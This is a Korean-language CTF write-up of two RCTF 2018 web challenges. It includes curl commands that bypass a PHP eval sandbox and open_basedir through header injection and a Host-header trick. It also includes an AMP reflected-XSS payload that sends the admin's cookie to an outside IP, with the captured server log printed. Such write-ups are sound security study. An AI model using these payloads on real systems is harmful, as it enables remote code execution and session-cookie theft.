# RCTF 2018 Quals 

## Introduce

뭔가 요즘 xctf 플랫폼을 많이 사용하는 것 같다.

## writeup

### - r-cursive

>LUL dat font
>
>http://r-cursive.ml

문제에 접속하면 단순히 sandbox를 생성해주는 페이지에 접속한다.~~(폰트가 정말 거지같다.)~~

```html
<?php
$token = sha1($_SERVER['REMOTE_ADDR']);
$dir = '../sandbox/'.$token.'/';
is_dir($dir) ?: mkdir($dir);
is_file($dir.'index.php') ?: file_put_contents($dir.'index.php', str_replace('#SHA1#', $token, file_get_contents('./template')));
switch($_GET['action'] ?: ''){
    case 'go':
        header('Location: http://'.$token.'.sandbox.r-cursive.ml:1337/');
        break;
    case 'reset':
        system('rm -rf '.$dir);
        break;
    default:
        show_source(__FILE__);
}
?>
<style>code{font-family: Segoe Script, Brush Script MT, cursive; font-size: 1.337em;}</style>
```

action=go를 통해 sandbox페이지로 이동해보면 소스코드는 간단하다.

```html
<?php
sha1($_SERVER['REMOTE_ADDR']) === 'c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295' ?: die();
';' === preg_replace('/[^\W_]+\((?R)?\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);
```

cmd뒤에 명령어를 삽입해주면 되는데, 정규식으로 인해 쿼리는 `phpinfo();`, `print_r(scandir(getcwd()));` 와 같은 형태로 함수로만 넣을 수 있다.

하지만 이 문제는 `open_basedir`이 적용되어 있어, `/var/www/sandbox/c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295/`,`/tmp/` 외의 디렉토리는 사용할 수 없다.

disable_functions, disable_classes를 보기위해 `phpinfo()` 를 실행시켰는데, 다른 것 또한 발견하였다.

```ini
disable_functions = system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,mb_send_mail,assert,dl,set_time_limit,ignore_user_abort,symlink,link	
disable_clsass = GlobIterator,DirectoryIterator,FilesystemIterator,RecursiveDirectoryIterator	
auto_prepend_file = /var/www/sandbox/init.php
open_basedir = /var/www/sandbox/c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295/:/tmp/	
Loaded Modules = ... mod_vhost_alias
```

우선 정규식을 우회하기 위해 `getallheaders()`함수를 사용했다.

```
$ curl "http://c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295.sandbox.r-cursive.ml:1337/?cmd=eval(end(getallheaders()));" -H "a:print_r(readfile('../init.php'));print_r(ini_get('open_basedir'));" 
<br />
<b>Warning</b>:  readfile(): open_basedir restriction in effect. File(../init.php) is not within the allowed path(s): (/var/www/sandbox/c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295/:/tmp/) in <b>/var/www/sandbox/c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295/index.php(3) : eval()'d code(1) : eval()'d code</b> on line <b>1</b><br />
<br />
<b>Warning</b>:  readfile(../init.php): failed to open stream: Operation not permitted in <b>/var/www/sandbox/c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295/index.php(3) : eval()'d code(1) : eval()'d code</b> on line <b>1</b><br />
/var/www/sandbox/c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295/:/tmp/
```

이제 `open_basedir`을 우회하기 위해 header의 host를 `.r-cursive.ml` 로 변경하였고, 이로 인해 sandbox를 탈출하여 init.php를 열었고 플래그를 획득할 수 있었다.

```
$ curl "http://c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295.sandbox.r-cursive.ml:1337/c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295/?cmd=eval(end(getallheaders()));" -H "a:print_r(readfile('../init.php'));print_r(ini_get('open_basedir'));" -vv -H "Host:.r-cursive.ml"

<?php
    ini_set("open_basedir", $_SERVER['DOCUMENT_ROOT']."/:/tmp/");
    // flag: RCTF{apache_mod_vhost_alias_should_be_configured_correctly}
?>
```



FLAG : RCTF{apache_mod_vhost_alias_should_be_configured_correctly}



### - AMP

> No Description

페이지에 접속하면 steins;gate 0를 배경으로 한 페이지가 나타난다.

```html

<!doctype html>
<html ⚡>
  <head>
    <meta charset="utf-8">
    <script async src="https://cdn.ampproject.org/v0.js" nonce="a42dd51d96f82575cfd2fe674c3bb46e"></script>
    <title>⚡</title>
    <link rel="canonical" href="http://example.ampproject.org/article-metadata.html">
    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
    <script type="application/ld+json" nonce="a42dd51d96f82575cfd2fe674c3bb46e">
      {
        "@context": "http://schema.org",
        "@type": "NewsArticle",
        "headline": "Open-source framework for publishing content",
        "datePublished": "2015-10-07T12:02:41Z",
        "image": [
          "logo.jpg"
        ]
      }
    </script>
    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
    <style amp-custom>body {background:url(background.jpg) no-repeat;background-size:cover;}html,body,.main{min-height:100vh;width:100%;color:#fff;}.main{align-items: center;display: flex;justify-content: center; flex-direction: column;}.main *{ zoom: 2;}.grecaptcha-badge{display: none}</style>
  </head>
  <body>
      <div class="main">
        <h1>HEY</h1>
        <h3>INPUT YOUR NAME AFTER QUERYSTRING</h3>
      </div>
  </body>
</html>

```

Querystring에 name을 넣으라고 하니까 넣어보자.

```
http://amp.2018.teamrois.cn/?name=shpik
```

그러면 페이지에 다음과 같은 문구가 추가된다.

```html
Dear shpik:
YOU'RE BEING TRACKING
<!-- OK, I don't care AMP Standard -->
<!-- It just wastes my time. -->
[STOP TRACKING ME]
```

..?  `STOP TRACKING ME` 를 누르면 뭔가 admin이 이 페이지를 읽는 것 같다.

그 외에 스크립트 또한 삽입이 잘 되는 걸로 봐서 `Reflect XSS` 인 모양이다. 

`AMP`라는 `javascript` 모듈을 사용하는 것 같아서 찾아보았고, 다음의 정보를 찾았다.([AMP Project](https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md#client-id))

> #### Client ID
>
> Provides a per document-source-origin (the origin of the website where you publish your AMP doc) and user identifier. The client ID will be the same for the same user if they visit again within one year. The client ID should behave roughly similar to a cookie storing a session ID for one year. If the AMP document is not served through the Google AMP Cache, the client ID is replaced with a cookie of the name of the `cid scope` argument (see below). If it is not present, a cookie will be set with the same name. These cookies will always have the prefix "amp-" followed by a random base64 encoded string.
>
> - **platform variable**: `CLIENT_ID`
>
>   - Example: 
>
>   ```
>   <amp-pixel src="https://foo.com/pixel?cid=CLIENT_ID(cid-scope-cookie-fallback-name)"></amp-pixel>
>   
>   <amp-user-notification
>       layout=nodisplay
>       id="user-consent"
>       data-show-if-href="https://foo.com/api/show"
>       data-dismiss-href="https://foo.com/api/dismissed">
>       This site uses cookies to personalize content.
>       <a href="">Learn more.</a>
>      <button on="tap:user-consent.dismiss">I accept</button>
>   </amp-user-notification>
>   
>   <!-- Client ID is not provided until `user-consent` is dismissed -->
>   <amp-pixel src="https://foo.com/pixel?cid=CLIENT_ID(cid-scope-cookie-fallback-name,user-consent)"></amp-pixel>
>   ```
>
> - **amp-analytics variable**: `${clientId}`
>
>   - Example usage: `${clientId(foo)}`
>   - Example value: `U6XEpUs3yaeQyR2DKATQH1pTZ6kg140fvuLbtl5nynbUWtIodJxP5TEIYBic4qcV`

저기에 있는 `Example` 을 그냥 가져다 써도 될 것 같다.

```html
<amp-pixel src="https://35.200.67.206:10101/?cid=CLIENT_ID(FLAG)"></amp-pixel>
<amp-user-notification layout=nodisplay id="FLAG" data-show-if-href="https://35.200.67.206:10101" data-dismiss-href="https://35.200.67.206:10101">This site uses cookies to personalize content.<a href="">Learn more.</a><button on="tap:user-consent.dismiss">I accept</button></amp-user-notification>
<amp-pixel src="https://35.200.67.206:10101/?cid=CLIENT_ID(FLAG,FLAG)"></amp-pixel>
```

위의 코드를 name으로 넣어주었으며, FLAG를 얻을 수 있었다.

```
58.76.163.238 - - [22/May/2018 15:30:23] "GET /?cid=flag_is_in_admin_cookie HTTP/1.1" 200 -
58.76.163.238 - - [22/May/2018 15:30:23] "GET /?cid= HTTP/1.1" 200 -
58.76.163.238 - - [22/May/2018 15:30:24] "GET /?cid=RCTF%7BEl_PsY_CONGRO0_sg0%7D HTTP/1.1" 200 -
58.76.163.238 - - [22/May/2018 15:30:24] "GET /?cid= HTTP/1.1" 200 -
```

 

FLAG : RCTF{El_PsY_CONGRO0_sg0}